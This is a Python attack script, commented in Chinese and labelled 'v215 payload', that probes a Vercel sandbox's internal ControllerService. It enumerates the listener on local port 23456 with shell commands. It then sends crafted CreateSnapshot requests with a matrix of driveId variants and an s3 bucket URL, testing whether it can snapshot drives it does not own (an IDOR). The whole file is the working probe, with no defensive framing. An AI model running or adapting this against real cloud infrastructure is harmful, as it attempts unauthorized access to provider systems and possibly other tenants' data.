# -*- coding: utf-8 -*-
"""v215 payload: CreateSnapshot driveId IDOR 探测 + 23456 监听者识别
1. ss -tlnp 看 23456 监听者 (沙箱内进程 vs 代理)
2. driveId 变体矩阵 (无效变体应报错不 stop, 有效变体 stop 自己)
3. 记录每个变体响应 -> 判定 driveId 是否服务端解析 (IDOR 面)"""
import socket, time, json, subprocess, os

def log(s, maxlen=3000):
    s = str(s)
    if len(s) > maxlen:
        s = s[:maxlen] + '...[TRUNC %d]' % len(s)
    print('[%.1f] %s' % (time.time(), s), flush=True)

CTRL = 'vercel.sandbox.api.controller.v1.ControllerService'

def post(port, path, body, t=8):
    b = json.dumps(body).encode()
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(('127.0.0.1', port))
        hdrs = 'POST %s HTTP/1.1\r\nHost: x\r\nContent-Type: application/json\r\n' % path
        hdrs += 'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\nConnection: close\r\n\r\n' % len(b)
        s.sendall(hdrs.encode() + b)
        d = b''
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                d += c
                if len(d) > 6000:
                    break
        except Exception:
            pass
        s.close()
        st = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        return st, d[:4500]
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b''

# 1. 23456 监听者识别
log('=== 1 listener id ===')
for cmdline in [
    'ss -tlnp 2>/dev/null | grep 23456 || netstat -tlnp 2>/dev/null | grep 23456 || echo SS-NONE',
    'cat /proc/net/tcp 2>/dev/null | grep -i ":5BA8" | head -5',
    'ps aux | grep -E "23456|controller|sbc" | grep -v grep | head -5',
]:
    try:
        r = subprocess.run(['bash', '-c', cmdline], capture_output=True, timeout=4)
        out = (r.stdout + r.stderr).decode(errors='replace').strip()
        log('CMD %s -> %s' % (cmdline[:40], out[:500] or 'EMPTY'))
    except Exception as e:
        log('CMD EXC %s' % e)

# 2. driveId 变体矩阵 (无效变体不 stop, 可连续测)
log('=== 2 driveId variants ===')
variants = [
    ('empty', ''),
    ('nonexistent', 'nonexistent-zzz-215'),
    ('rootfs', 'rootfs'),
    ('vda', 'vda'),
    ('upper', 'upper'),
    ('overlay', 'overlay'),
    ('self-sbname', 'v215'),
]
for name, did in variants:
    try:
        st, pay = post(23456, '/' + CTRL + '/CreateSnapshot',
                       {'driveId': did, 'bucketBaseUrl': 's3://v1.vercel.com/snap/x'}, t=6)
        log('VAR %-14s driveId=%-22r -> %s %r' % (name, did, st, pay[:600]))
    except Exception as e:
        log('VAR %s EXC %s' % (name, e))
    time.sleep(2)

log('=== 3 alive check ===')
try:
    r = subprocess.run(['bash', '-c', 'echo STILL-ALIVE; touch /vercel/sandbox/v215alive'], capture_output=True, timeout=3)
    log('ALIVE %r' % (r.stdout + r.stderr).decode(errors='replace')[:200])
except Exception as e:
    log('ALIVE EXC %s' % e)

log('V215_DONE')
